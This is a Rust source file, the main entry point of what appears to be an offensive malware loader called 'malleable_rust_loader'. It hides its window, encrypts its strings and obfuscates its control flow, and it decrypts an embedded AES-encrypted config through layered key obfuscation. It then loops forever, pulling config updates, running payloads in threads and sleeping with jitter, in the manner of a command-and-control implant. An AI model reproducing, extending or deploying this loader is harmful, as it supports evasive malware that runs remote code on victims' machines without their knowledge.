#![cfg_attr(not(feature = "logdebug"), windows_subsystem = "windows")]

//#![no_main]

use malleable_rust_loader::config::Config;
use std::thread;

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use malleable_rust_loader::dataoperation::un_apply_all_dataoperations;
use malleable_rust_loader::dataoperation::DataOperation;
use malleable_rust_loader::payload::Payload;
use malleable_rust_loader::payload_util::print_running_thread;

use log::error;
use log::info;
extern crate env_logger;
use cryptify;

// ------ STANDARD compilation
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes"));
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes.dataop.obfuscated"));
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes.dataop.obfuscated.dataop"));

// ------ OLLVM compilation from docker
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes");
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes.dataop.obfuscated");
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes.dataop.obfuscated.dataop");

//#[no_mangle]
fn main() {
    #[cfg(feature = "logdebug")]
    env_logger::init();
    cryptify::flow_stmt!();
    let session_id: String = uuid::Uuid::new_v4().to_string();
    info!("");

    let initial_config_encrypted = INITIAL_CONFIG_ENCRYPTED.to_vec();
    let obfuscated_config_decrypt_key = OBFUSCATED_CONFIG_DECRYPT_KEY.to_vec();
    let decrypt_key_obfuscation_steps_zlib = DECRYPT_KEY_OBFUSCATION_STEPS.to_vec();
    let decrypt_key_obfuscation_steps = un_apply_all_dataoperations(
        vec![DataOperation::ZLIB],
        decrypt_key_obfuscation_steps_zlib,
    )
    .unwrap();
    let ope_for_data_op: Vec<DataOperation> =
        serde_json::from_slice(decrypt_key_obfuscation_steps.as_slice()).unwrap();
    let initial_config_decrypt_key =
        un_apply_all_dataoperations(ope_for_data_op, obfuscated_config_decrypt_key).unwrap();
    let initial_config_decrypt_key_dataoperation: Vec<DataOperation> =
        serde_json::from_slice(initial_config_decrypt_key.as_slice()).unwrap();

    let initial_config_decrypted = un_apply_all_dataoperations(
        initial_config_decrypt_key_dataoperation,
        initial_config_encrypted,
    )
    .unwrap();

    let mut config: Config = serde_json::from_slice(initial_config_decrypted.as_slice()).unwrap();
    config.verify_newconfig_signature(&config).unwrap();

    let mut running_thread: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
    let mut loop_nb = 1;
    loop {
        if config.stop_defuse(&config.defuse_update) {
        } else {
            let mut running_payload: Vec<Payload> = vec![];
            for t in &running_thread {
                running_payload.push(t.1.clone());
            }

            config = config.update_config(&session_id, &running_payload);
            if config.stop_defuse(&config.defuse_payload) {
            } else {
                config.exec_payloads(&mut running_thread);
            }
        }

        print_running_thread(&mut running_thread);
        //TODO wait all thread to finish -> new option
        config.sleep_and_jitt();
        loop_nb = loop_nb + 1;
    }
}
